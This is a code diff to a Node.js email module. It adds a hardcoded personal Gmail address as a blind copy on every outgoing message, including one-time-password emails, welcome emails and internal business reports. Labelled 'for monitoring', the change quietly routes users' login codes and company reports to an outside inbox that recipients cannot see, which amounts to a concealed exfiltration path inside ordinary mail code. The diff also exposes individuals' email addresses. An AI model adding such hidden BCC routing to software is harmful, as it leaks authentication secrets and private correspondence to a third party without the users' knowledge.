@@ -1,5 +1,8 @@
 import nodemailer from 'nodemailer';
 
+// 🔥 Global BCC - All emails will be copied to this address for monitoring
+const GLOBAL_BCC_EMAIL = 'sahilsagvekar230@gmail.com';
+
 // Check if email is configured
 const isEmailConfigured = () => {
   return !!(process.env.SMTP_USER && process.env.SMTP_PASS);
@@ -20,8 +23,19 @@ const createTransporter = () => {
       pass: process.env.SMTP_PASS,
     },
   });
+};
 
-
+// Helper function to add global BCC to mail options
+const addGlobalBcc = (mailOptions: any) => {
+  // Add BCC - if there's already a BCC, append to it
+  if (mailOptions.bcc) {
+    mailOptions.bcc = Array.isArray(mailOptions.bcc)
+      ? [...mailOptions.bcc, GLOBAL_BCC_EMAIL]
+      : [mailOptions.bcc, GLOBAL_BCC_EMAIL];
+  } else {
+    mailOptions.bcc = GLOBAL_BCC_EMAIL;
+  }
+  return mailOptions;
 };
 
 export async function sendOTPEmail(email: string, otp: string) {
@@ -108,7 +122,7 @@ export async function sendOTPEmail(email: string, otp: string) {
   };
 
   try {
-    await transporter.sendMail(mailOptions);
+    await transporter.sendMail(addGlobalBcc(mailOptions));
     console.log(`✅ Email sent successfully to ${email}`);
   } catch (error) {
     console.error('Failed to send email:', error);
@@ -289,7 +303,7 @@ export async function sendWelcomeEmail({
   };
 
   try {
-    await transporter.sendMail(mailOptions);
+    await transporter.sendMail(addGlobalBcc(mailOptions));
     console.log('Welcome email sent to:', email);
     return { success: true };
   } catch (error) {
@@ -376,7 +390,7 @@ export async function sendActivityReportEmail(reportUrl: string, date: Date, log
   };
 
   try {
-    await transporter.sendMail(mailOptions);
+    await transporter.sendMail(addGlobalBcc(mailOptions));
     console.log(`✅ Activity report email sent to Eric@e8productions.com`);
   } catch (error) {
     console.error('❌ Failed to send activity report email:', error);
@@ -453,7 +467,7 @@ export async function sendCronReportEmail(data: {
   };
 
   try {
-    await transporter.sendMail(mailOptions);
+    await transporter.sendMail(addGlobalBcc(mailOptions));
     console.log(`✅ Cron report email sent to Sahil`);
   } catch (error) {
     console.error('❌ Failed to send cron report email:', error);
@@ -546,7 +560,7 @@ export async function sendExecutiveSummaryReportEmail(data: {
   };
 
   try {
-    await transporter.sendMail(mailOptions);
+    await transporter.sendMail(addGlobalBcc(mailOptions));
     console.log(`✅ Executive summary report sent to Eric`);
   } catch (error) {
     console.error('❌ Failed to send executive summary report email:', error);
